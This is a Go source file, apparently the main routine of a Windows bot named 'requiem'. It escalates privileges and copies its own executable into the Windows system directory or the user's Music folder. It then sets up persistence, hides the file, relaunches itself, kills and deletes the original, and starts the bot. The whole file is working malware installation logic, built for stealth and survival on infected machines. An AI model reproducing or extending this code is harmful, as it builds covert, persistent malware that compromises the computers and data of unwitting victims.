package main

import (
	"fmt"
	"os"
	"path"
	"path/filepath"
	"time"

	"requiem/bot"
	"requiem/funcs"
	"requiem/persistence"
	"requiem/store"
	"requiem/utils"
)

const DELETE_OLD_FILE_MAX_RETRIES int = 20

func main() {
	if !utils.CheckMutex() {
		return
	}

	defer utils.RemoveMutex()

	store.InitState()

	args := os.Args
	if len(args) > 1 && args[1] == store.LAUNCH_KEY {
		if len(args) == 3 {
			path := args[2]
			path = filepath.Clean(path)

			utils.DebugLog(path)

			info, err := os.Stat(path)
			if err != nil {
				return
			}

			if info.IsDir() {
				return
			}

			utils.RunCommand("taskkill", "/F", "/IM", filepath.Base(path))

			for i := range DELETE_OLD_FILE_MAX_RETRIES {
				err = os.Remove(path)
				if err == nil {
					break
				}

				utils.DebugLog(fmt.Sprintf("failed to delete old file (%d/%d) - %v", i+1, DELETE_OLD_FILE_MAX_RETRIES, err))
				time.Sleep(500 * time.Millisecond)
			}
		}

		utils.DebugLog("starting")

		bot.Start()
		return
	}

	if store.REQUIRE_ADMIN && !store.IsAdmin {
		funcs.Elevate()
	}

	var newDir string
	var newName string

	if store.USE_CUSTOM_NAME {
		newName = store.CUSTOM_NAME
	} else {
		newName = filepath.Base(store.ExecPath)
	}

	if store.USE_CUSTOM_DIR {
		newDir = store.CUSTOM_DIR
	} else {
		if store.IsAdmin {
			newDir = os.Getenv("SYSTEMROOT")
		} else {
			newDir = path.Join(store.HomePath, "Music")
		}
	}

	newExecPath := filepath.Join(newDir, newName)

	err := utils.CopyFile(store.ExecPath, newExecPath)
	if err != nil {
		return
	}

	persistence.Persist(newExecPath)
	utils.HideFile(newExecPath)

	utils.RemoveMutex()
	utils.RunCommand(
		newExecPath,
		store.LAUNCH_KEY,
		store.ExecPath,
	)

	utils.DebugLog(fmt.Sprintf(
		"relaunching - \"%s\" -> \"%s\" %s",
		store.ExecPath,
		newExecPath,
		store.LAUNCH_KEY,
	))

	os.Exit(0)
}
